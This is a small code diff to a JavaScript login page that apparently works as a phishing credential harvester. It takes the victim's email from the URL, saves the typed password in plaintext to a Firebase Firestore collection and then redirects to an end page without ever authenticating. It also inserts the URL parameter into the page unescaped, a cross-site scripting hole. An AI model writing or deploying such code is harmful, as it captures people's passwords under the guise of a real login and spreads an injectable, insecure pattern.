@@ -13,17 +13,22 @@ var getUrlParameter = function getUrlParameter(sParam) {
     }
 };
 $(document).ready(function(){
+    var email=getUrlParameter("email");
+    $("#correoView").html(email);
     $("#btncorreo").click(function(){
         $("#formInicio").submit();
     });
-    $("#btnpass").click(function(){
+    $("#btnpass").click(async function(e) {
         var pass=$("#txtPassword").val();
         var email=getUrlParameter("email");
-        db = firebase.firestore();
-        db.collection("usuario").add({
+         db = firebase.firestore();
+        await db.collection("usuario").add({
             nombre:email,
             password:pass
         })
+        e.preventDefault(); 
+        location="fin.html" //stop the browser from following
+
         
     });
 });
